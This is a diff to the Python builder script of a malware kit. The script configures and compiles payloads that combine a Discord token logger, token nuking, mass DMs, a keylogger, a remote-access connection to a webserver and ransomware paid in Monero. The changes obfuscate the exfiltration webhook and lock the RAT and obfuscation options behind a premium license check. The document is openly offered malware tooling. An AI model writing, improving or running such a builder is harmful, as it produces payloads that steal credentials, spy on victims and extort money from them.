@@ -10,6 +10,9 @@ class Main:
         print(f'{Fore.CYAN}Compiling program...{Style.RESET_ALL}')
         self.compile(config)
 
+    def flush(self):
+        print(' '*70, end='\r')
+
     def banner(self):
         print(fade.greenblue("""
    ▄████████    ▄████████    ▄███████▄     ███      ▄█   ▄████████ ▀████    ▐████▀ 
@@ -24,22 +27,20 @@ class Main:
 
     def get_answer(self, message):
         answers = ('n', 'y')
-
-        answer = input(message)
+        
 
         while True:
+            answer = input(message)
             
             if not answer:
                 print(self.color("Invalid answer!", 'red'), end="\r")
                 time.sleep(1)
-                answer = input(message)
                 continue
 
             target = answer[0].lower()
             if not target in answers:
                 print(self.color("Invalid answer!", 'red'), end="\r")
                 time.sleep(1)
-                answer = input(message)
                 continue
 
             return target == 'y'
@@ -55,7 +56,7 @@ class Main:
             "REBOOTS_ALLOWED": reboots_allowed,
             "MONERO_WALLET": wallet,
             "CRYPTO_AMOUNT": cost,
-            "WEBHOOK": "'webhook'" if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
+            "WEBHOOK": f"""O0O000OOO00O0OOO0("{webhook}").decode()""" if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
             "TOKEN_LOGGER": token_logger,
             "NUKE_TOKEN": auto_nuke,
             "MASSDM": massdm,
@@ -148,34 +149,43 @@ class Main:
                     print(char)
                 time.sleep(0.05)
 
-            while True: # No, deleting this will not "crack the program"
-                if test.json()['response']['premium']:
-                    print(color("Enter Obfuscation Level (1-5): "), end="> ")
-                    try:
-                        self.recursion = int(input(""))
-                    except:
-                        print(color('Invalid Input!', 'red'), end='\r')
-                        time.sleep(1)
-                        continue
+            self.premium = test.json()['response']['premium']
 
-                    print(color("Set Base Obfuscation Level (2-55000): "), end="> ")
-                    try:
-                        self.base = int(input(""))
-                    except:
-                        print(color('Invalid Input!', 'red'), end='\r')
-                        time.sleep(1)
-                        continue
+            print(color("Enter Obfuscation Level (1-5): "), end="> ")
+            while self.premium: # No, deleting this will not "crack the program"
+                try:
+                    self.recursion = int(input(""))
+                except:
+                    print(color('Invalid Input!', 'red'), end='\r')
+                    time.sleep(1)
 
-                    self.bytes = self.get_answer(color("Use random byte characters (Y or N): ")+"> ")
-                    if not self.bytes:
-                        self.base = 93
+            else:
+                print(color('(Premium required)', 'red'), end='\r')
+                time.sleep(1)
+                self.flush()
+                    
 
-                else:
-                    self.recursion = 0
-                    self.bytes = 0
-                    self.base = 0
+            print(color("Set Base Obfuscation Level (2-55000): "), end="> ")
+            while self.premium:
+                try:
+                    self.base = int(input(""))
+                except:
+                    print(color('Invalid Input!', 'red'), end='\r')
+                    time.sleep(1)
+                    continue
+
+                self.bytes = self.get_answer(color("Use random byte characters (Y or N): ")+"> ")
+                if not self.bytes:
+                    self.base = 93
 
                 break
+            else:
+                print(color('(Premium required)', 'red'), end='\r')
+                time.sleep(1)
+                self.flush()
+                self.recursion = 0
+                self.bytes = 0
+                self.base = 0
 
             break
 
@@ -213,7 +223,14 @@ class Main:
             admin = config['RUN_WITH_ADMIN']
 
         else:
-            rat_client = self.get_answer(color("Connect to webserver? (Y or N): ")+"> ")
+            if self.premium:
+                rat_client = self.get_answer(color("Connect to webserver? (Y or N): ")+"> ")
+            else:
+                print(color("Connect to webserver? (Y or N): ")+"> ", end="")
+                print(color("(Premium required)", 'red'), end='\r')
+                rat_client = False
+                time.sleep(1)
+                self.flush()
 
             if rat_client:
                 print(color("Enter server address: "), end="")
@@ -227,6 +244,7 @@ class Main:
                 keylogger = self.get_answer(color("Enable Keylogging (Y or N): ")+"> ")
 
             if not dynamic_webhook:
+                print(color("Enter Discord webhook: ", 'blue'), end="")
                 webhook = base64.b64encode(input("> ").encode())
 
             ransomware = self.get_answer(color("Enable Ransomware (Y or N): ")+"> ")
